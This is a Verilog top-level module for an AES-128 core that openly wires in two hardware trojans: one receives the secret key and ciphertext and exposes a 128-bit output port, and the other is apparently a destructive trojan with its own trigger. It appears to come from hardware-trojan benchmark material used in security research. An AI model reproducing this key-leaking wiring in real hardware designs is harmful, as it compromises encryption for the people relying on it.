`timescale 1ns / 1ps

module AES_top (clk, rst, state, key, out, sample_trojan_out, destroy_trojan_out); 
    
    input clk;
    input rst;
	input [127:0] state; 
    input [127:0] key;
    output wire [127:0] out;
    output wire [127:0] sample_trojan_out;
    output wire [127:0] destroy_trojan_out;
 
	wire sample_Tj_Trig;
	wire destroy_Tj_Trigg;
	wire [127:0] ciphertext;

	aes_128 aes(.clk(clk), .state(state), .key(key), .out(ciphertext), .sample_trojan_trigger(sample_Tj_Trig), .destroy_trigger(destroy_Tj_Trigg));
    assign out = ciphertext;
    sample_trojan sample_HT(.clk(clk), .sample_trojan_trigger(sample_Tj_Trig), .key(key), .ciphertext(out), .trojan_out(sample_trojan_out));
    destroy_HT destroy_trojan(.clk(clk), .destroy_trigger(destroy_Tj_Trigg), .ciphertext(out), .trojan_out(destroy_trojan_out));
endmodule